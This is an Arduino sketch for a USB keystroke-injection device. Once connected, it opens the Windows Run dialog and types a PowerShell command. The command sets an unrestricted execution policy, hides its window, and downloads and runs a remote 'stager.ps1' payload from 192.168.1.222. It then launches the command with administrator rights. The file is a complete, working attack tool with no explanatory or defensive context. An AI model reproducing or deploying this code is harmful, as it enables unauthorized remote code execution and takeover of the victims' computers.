#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void runasAdmin(){
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_LEFT_CTRL);
  delay(10);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
}

void setup()
{
  Keyboard.begin();
  delay(500);
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(250);
  Keyboard.print("powershell.exe -w 1 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted & powershell.exe -windowstyle 1 -c \"iex(New-Object Net.WebClient).DownloadString('http://192.168.1.222/stager.ps1')\"");
  delay(250);
  runasAdmin();
  Keyboard.end();
}
void loop() {}